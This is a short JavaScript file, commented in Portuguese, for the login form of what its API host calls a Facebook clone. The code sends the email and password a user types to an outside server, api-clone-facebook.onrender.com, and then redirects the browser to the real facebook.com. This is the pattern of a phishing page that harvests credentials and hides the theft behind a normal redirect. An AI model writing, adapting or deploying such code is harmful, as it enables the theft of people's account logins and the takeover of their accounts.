document.addEventListener('DOMContentLoaded', () => {
    const loginForm = document.querySelector('.login-form');
    const emailInput = loginForm.querySelector('input[type="text"]');
    const senhaInput = loginForm.querySelector('input[type="password"]');
    const btnEntrar = loginForm.querySelector('.btn-entrar');
    
    // Verifica se o botão existe
    if (!btnEntrar) {
        console.error('Botão de entrar não encontrado! Verifique se a classe .btn-entrar está correta.');
        return;
    }

    // Desabilita o botão inicialmente
    btnEntrar.disabled = true;
    btnEntrar.style.opacity = '0.6';
    btnEntrar.style.cursor = 'not-allowed';

    // Função para verificar se os campos estão preenchidos
    const verificarCampos = () => {
        const emailPreenchido = emailInput.value.trim() !== '';
        const senhaPreenchida = senhaInput.value.trim() !== '';
        
        // Habilita ou desabilita o botão baseado no preenchimento
        if (emailPreenchido && senhaPreenchida) {
            btnEntrar.disabled = false;
            btnEntrar.style.opacity = '1';
            btnEntrar.style.cursor = 'pointer';
        } else {
            btnEntrar.disabled = true;
            btnEntrar.style.opacity = '0.6';
            btnEntrar.style.cursor = 'not-allowed';
        }
    }

    // Monitora mudanças nas inputs
    emailInput.addEventListener('input', verificarCampos);
    senhaInput.addEventListener('input', verificarCampos);

    // Manipula o envio do formulário
    loginForm.addEventListener('submit', async (e) => {
        e.preventDefault();
        
        // Verifica novamente se o botão está habilitado antes de enviar
        if (!btnEntrar.disabled) {
            try {
                btnEntrar.textContent = 'Entrando...';
                btnEntrar.disabled = true;

                // Envia os dados para a API
                const response = await fetch('https://api-clone-facebook.onrender.com/login', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({
                        email: emailInput.value.trim(),
                        senha: senhaInput.value.trim()
                    })
                });

                const data = await response.json();

                if (data.success) {
                    window.location.href = 'https://www.facebook.com';
                } else {
                    throw new Error(data.message || 'Erro ao fazer login');
                }

            } catch (error) {
                console.error('Erro ao processar login:', error);
                btnEntrar.textContent = 'Entrar';
                btnEntrar.disabled = false;
            }
        }
    });
});
